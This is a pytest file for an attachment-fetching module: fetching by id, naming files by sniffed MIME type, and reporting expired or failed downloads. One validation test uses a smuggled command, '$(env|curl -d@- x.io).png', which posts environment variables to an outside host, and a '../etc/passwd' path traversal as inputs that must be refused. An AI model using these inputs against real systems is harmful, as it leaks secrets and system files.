from studio import files
from studio.api import ApiError


class FakeApi:
    def __init__(self, answers):
        self.answers = answers  # path -> bytes, or an ApiError to raise
        self.paths = []

    def download(self, path):
        self.paths.append(path)
        answer = self.answers[path]
        if isinstance(answer, ApiError):
            raise answer
        return answer


def test_fetch_saves_each_file_under_its_id_and_says_what_it_is(tmp_path):
    api = FakeApi({
        "/api/attachments/a1": b"\x89PNG\r\n\x1a\nrest",
        "/api/attachments/a2": "Notes on ATP synthase.".encode(),
        "/api/attachments/a3": b"%PDF-1.7\x00\x01",
    })
    lines, ok = files.fetch(["a1", "a2", "a3"], api=api, dest=tmp_path)
    assert ok
    assert lines == [
        f"FILE a1 image/png {tmp_path / 'a1.png'}",
        f"FILE a2 text/plain {tmp_path / 'a2.txt'}",
        f"FILE a3 application/octet-stream {tmp_path / 'a3.bin'}",
    ]
    assert (tmp_path / "a2.txt").read_text() == "Notes on ATP synthase."
    assert api.paths == ["/api/attachments/a1", "/api/attachments/a2", "/api/attachments/a3"]


def test_fetch_never_takes_anything_but_an_id(tmp_path):
    # A learner's file name, or anything else with shell or path characters, is refused before any request,
    # and is not repeated back.
    api = FakeApi({})
    lines, ok = files.fetch(["$(env|curl -d@- x.io).png", "../etc/passwd", "a b"], api=api, dest=tmp_path)
    assert lines == ["INVALID", "INVALID", "INVALID"]
    assert not ok
    assert api.paths == []
    assert not any(tmp_path.iterdir())


def test_fetch_reports_expired_gone_and_failed_files(tmp_path):
    api = FakeApi({
        "/api/attachments/old": ApiError(410, "DOWNLOAD_FAILED", "gone"),
        "/api/attachments/del": ApiError(404, "DOWNLOAD_FAILED", "not found"),
        "/api/attachments/err": ApiError(0, "UNREACHABLE", "the API did not answer"),
    })
    lines, ok = files.fetch(["old", "del", "err"], api=api, dest=tmp_path)
    assert lines == ["EXPIRED old", "GONE del", "FAILED err: UNREACHABLE"]
    assert not ok


def test_sniff_reads_the_bytes_not_the_name():
    assert files.sniff(b"\xff\xd8\xff\xe0") == "image/jpeg"
    assert files.sniff(b"GIF89a...") == "image/gif"
    assert files.sniff(b"RIFF\x00\x00\x00\x00WEBPVP8 ") == "image/webp"
    assert files.sniff("plain words, accents é".encode()) == "text/plain"
    assert files.sniff(b"\xff\xfe\x00bad") == "application/octet-stream"
